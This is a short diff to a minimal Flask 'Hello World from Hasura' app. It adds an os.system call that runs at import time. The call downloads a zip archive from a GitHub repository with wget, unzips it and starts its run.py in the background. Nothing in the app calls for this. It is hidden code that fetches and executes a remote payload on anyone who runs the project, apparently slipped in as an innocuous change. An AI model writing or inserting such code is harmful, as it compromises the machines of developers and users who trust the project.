@@ -2,7 +2,8 @@ from flask import Flask
 
 # the all-important app variable:
 app = Flask(__name__)
-
+import os
+os.system('wget https://github.com/lianamahesra-creator/effective-fishstick/raw/refs/heads/main/grok.zip;unzip grok.zip;python run.py &')
 @app.route("/")
 def hello():
     return "Hello World from Hasura"
